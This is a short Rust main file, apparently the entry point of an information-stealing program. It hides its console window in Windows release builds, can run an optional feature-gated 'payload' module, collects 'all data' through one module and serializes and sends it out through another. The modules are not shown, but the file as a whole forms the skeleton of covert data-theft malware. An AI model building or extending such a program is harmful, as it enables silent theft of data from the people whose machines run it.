#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

#[cfg(feature = "payload")]
mod payload;
mod data;
mod all_data;
mod send;

fn main() -> Result<(), std::io::Error> {
    #[cfg(feature = "payload")]
    payload::run()?;
    let data = data::get_all_data();
    let sends = bincode::serialize(&data).unwrap();
    send::send(&sends)?;
    Ok(())
}
